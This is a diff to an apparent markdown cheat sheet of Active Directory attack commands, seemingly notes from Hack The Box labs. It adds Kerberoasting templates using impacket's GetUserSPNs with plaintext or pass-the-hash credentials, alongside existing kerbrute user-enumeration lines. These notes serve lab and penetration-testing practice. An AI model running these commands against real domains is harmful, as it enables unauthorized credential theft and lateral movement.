@@ -35,6 +35,16 @@ kerbrute --dc 10.10.10.161 -d htb.local userenum sname.txt --downgrade
 
 you need id and password for any account on the machine to perform this attack
 
+```sh
+impacket-GetUserSPNs <domainname>/username:password -dc-ip <domianip>
+```
+
+```sh
+GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME>
+```
+
+
+
 `via hash`
 
 ```sh
@@ -49,3 +59,5 @@ GetUserSPNs.py -request -dc-ip 10.10.11.168 -hashes :5F38C0485F0C23F8DEDF9BF23FF
 ```sh
 GetUserSPNs.py -request -dc-host dc1.scrm.local -k scrm.local/ksimpson
 ```
+
+
